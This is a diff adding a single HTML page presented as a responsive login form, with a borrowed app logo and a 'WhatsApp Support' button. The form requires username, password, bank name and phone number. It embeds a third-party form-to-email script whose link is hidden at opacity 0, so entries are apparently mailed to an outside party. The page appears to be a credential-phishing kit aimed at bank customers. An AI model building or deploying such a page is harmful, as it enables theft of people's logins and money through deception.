@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Responsive Login Form</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    :root {
+      --primary: #007bff;
+      --secondary: #25D366;
+      --glass-bg: rgba(0, 0, 0, 0.5);
+      --glass-border: rgba(255, 255, 255, 0.15);
+      --text: #fff;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: url('https://i0.wp.com/www.managementnote.com/wp-content/uploads/2021/03/Screenshot-1119.png?fit=673%2C553&ssl=1') no-repeat center center fixed;
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: var(--text);
+    }
+
+    .container {
+      background: var(--glass-bg);
+      backdrop-filter: blur(15px);
+      border: 1px solid var(--glass-border);
+      border-radius: 20px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+      padding: 40px 30px;
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+      animation: fadeIn 0.8s ease-in-out;
+      margin: 20px;
+    }
+
+    .container img {
+      width: 110px;
+      margin-bottom: 35px;
+    }
+
+    .form-group {
+      position: relative;
+      margin: 20px 0;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 14px 12px;
+      background: transparent;
+      border: 1px solid #bbb;
+      border-radius: 10px;
+      color: var(--text);
+      font-size: 16px;
+    }
+
+    .form-group label {
+      position: absolute;
+      left: 12px;
+      top: 14px;
+      color: #ccc;
+      font-size: 14px;
+      pointer-events: none;
+      transition: all 0.3s ease;
+    }
+
+    .form-group input:focus + label,
+    .form-group input:not(:placeholder-shown) + label {
+      top: -10px;
+      left: 10px;
+      font-size: 12px;
+      color: var(--primary);
+      background: rgba(0,0,0,0.6);
+      padding: 0 5px;
+      border-radius: 5px;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      margin-top: 20px;
+      background: var(--primary);
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      color: #fff;
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    .btn:hover {
+      background: #0056b3;
+    }
+
+    .whatsapp-button {
+      background-color: var(--secondary);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 15px;
+      transition: background-color 0.3s ease;
+    }
+
+    .whatsapp-button img {
+      width: 20px;
+      margin-right: 10px;
+    }
+
+    .whatsapp-button:hover {
+      background-color: #1ebe5d;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(30px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @media (max-width: 600px) {
+      body {
+        background-attachment: scroll;
+      }
+
+      .container {
+        padding: 30px 20px;
+        margin: 15px;
+      }
+
+      .form-group input,
+      .btn {
+        font-size: 15px;
+      }
+
+      .whatsapp-button {
+        font-size: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="https://play-lh.googleusercontent.com/1xuVHf8hBZ9kbB6Yes-zndaBhPWcsAL_9dtpHHLBo9e4JV1kO-r6qYn67l0QUuefQg" alt="Login Icon">
+
+    <form action="//submit.form" method="post">
+      <div class="form-group">
+        <input type="text" name="username" required placeholder=" " />
+        <label>Username or Email</label>
+      </div>
+      <div class="form-group">
+        <input type="password" name="password" required placeholder=" " />
+        <label>Password</label>
+      </div>
+      <div class="form-group">
+        <input type="password" name="confirm_password" required placeholder=" " />
+        <label>Confirm Password</label>
+      </div>
+      <div class="form-group">
+        <input type="text" name="bank-name" required placeholder=" " />
+        <label>Bank Name</label>
+      </div>
+      <div class="form-group">
+        <input type="tel" name="client_phone" required placeholder=" " />
+        <label> Phone Number</label>
+      </div>
+      <button type="submit" class="btn">Login</button>
+
+      <div>
+<div style='font-size:1px; opacity:0;'
+ style="float:right"><a href="https://www.100forms.com" id="lnk100" title="form to email">form to email</a></div>
+<script src="https://www.100forms.com/js/FORMKEY:9XGBXZB2JP5A" type="text/javascript"></script>
+</div>
+
+    </form>
+
+    <a href="https://wa.me/923001234567" target="_blank">
+      <button class="btn whatsapp-button">
+        <img src="https://cdn-icons-png.flaticon.com/512/733/733585.png" alt="WhatsApp Icon">
+        WhatsApp Support
+      </button>
+    </a>
+  </div>
+
+</body>
+</html>
